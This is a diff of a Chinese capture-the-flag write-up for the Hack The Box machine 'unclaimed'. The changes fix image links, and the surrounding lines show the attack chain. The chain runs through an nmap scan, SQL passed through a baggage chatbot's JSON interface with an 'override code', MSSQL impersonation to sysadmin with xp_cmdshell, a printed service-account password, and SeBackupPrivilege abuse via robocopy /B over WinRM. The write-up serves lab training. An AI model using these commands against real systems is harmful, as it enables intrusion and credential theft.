@@ -26,7 +26,7 @@ echo '10.129.206.209 unclaimed.htb' >> /etc/hosts
 nmap -Pn -p 80,135,139,445,5985,47001 -sV --version-light 10.129.206.209
 ```
 
-![1](../../unclaimed/01-nmap.png)
+![1](/unclaimed/01-nmap.png)
 
 首页是「HTB Airways - Baggage Services」，一个聊天窗口加几条示例行李牌。所有对话都走一个 JSON 接口：
 
@@ -56,7 +56,7 @@ curl -s -H 'Host: unclaimed.htb' -H 'Content-Type: application/json' \
 
 回显确认是 SQL Server 2025（17.0.1000.7），Windows 10.0.26100 内核。
 
-![2](../../unclaimed/02-chatbot.png)
+![2](/unclaimed/02-chatbot.png)
 
 ## 2. MSSQL：impersonate 到 sysadmin
 
@@ -87,7 +87,7 @@ EXEC xp_cmdshell 'cmd /c type C:\Users\svc_sql\Desktop\user.txt';
 REVERT;
 ```
 
-![3](../../unclaimed/03-user-flag.png)
+![3](/unclaimed/03-user-flag.png)
 
 为了省事，我把「覆盖码 + SQL」封装成一个小脚本，后面所有查询都走它：
 
@@ -135,7 +135,7 @@ User       : UNCLAIMED\svc_wtbackup
 Password   : W0rldTr@cer_B@ckup1
 ```
 
-![4](../../unclaimed/04-cred-decrypt.png)
+![4](/unclaimed/04-cred-decrypt.png)
 
 ## 4. WinRM 与 Backup Operators
 
@@ -160,7 +160,7 @@ robocopy /B C:\Users\Administrator\Desktop C:\Users\svc_wtbackup\Documents root.
 type C:\Users\svc_wtbackup\Documents\root.txt
 ```
 
-![5](../../unclaimed/05-root-flag.png)
+![5](/unclaimed/05-root-flag.png)
 
 > 这里踩了一个很隐蔽的坑：如果从目标机自己 `Invoke-Command -ComputerName 127.0.0.1` 连本机 WinRM，拿到的 token 里 `SeBackupPrivilege` 虽然列在 `whoami /priv` 里，但 `AdjustTokenPrivileges` 返回 `ERROR_NOT_ALL_ASSIGNED (1300)`，`robocopy /B` 会报 “You do not have the Backup and Restore Files user rights”。换成从攻击机发起真正的远程 WinRM 会话（winrm gem / evil-winrm）后，特权直接是 Enabled。
 
